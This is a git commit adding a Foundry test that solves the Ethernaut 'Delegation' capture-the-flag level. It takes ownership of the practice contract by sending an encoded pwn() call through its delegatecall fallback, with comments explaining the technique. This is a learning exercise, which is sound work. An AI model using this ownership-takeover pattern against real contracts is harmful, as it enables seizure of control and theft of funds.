06491448e3781e6288373fb511c5307cf4c2b3f1
simon busch <simon.busch@live.fr>
2022-10-10 17:36:52 +0200

    [ADD] delegation contract + solution

---
+++ test/Delegation.t.sol
@@ -0,0 +1,50 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.14;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import "../src/Delegation/DelegationFactory.sol";
+import "../src/Ethernaut.sol";
+
+// forge test --match-contract DelegationTest -vvvv
+contract DelegationTest is Test {
+    Ethernaut ethernaut;
+    address player = address(100);
+
+    function setUp() public {
+        // create new instance of ethernaut
+        ethernaut = new Ethernaut();
+        vm.deal(player, 5 ether); // give our address 5 ether
+    }
+
+    function testDelegationHack() public {
+        /****************
+         * Factory setup *
+         *************** */
+        DelegationFactory DelegationFactory = new DelegationFactory();
+        ethernaut.registerLevel(DelegationFactory);
+        vm.startPrank(player);
+        address levelAddress = ethernaut.createLevelInstance(DelegationFactory);
+        Delegation ethernautDelegation = Delegation(payable(levelAddress)); // 1000 is initial supply
+        /****************
+         *    Attack     *
+         *************** */
+        // The more straightforward way to call the Delegate and claim ownership
+        // is through the fallback function, as this function call it and pass it msg.data
+        // we can encode the function signature of the pwn() function to do so
+
+        //1. "complex" way
+        // address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
+        //2. straightforwad way
+        address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
+
+        /*****************
+         *Level Submission*
+         ***************  */
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
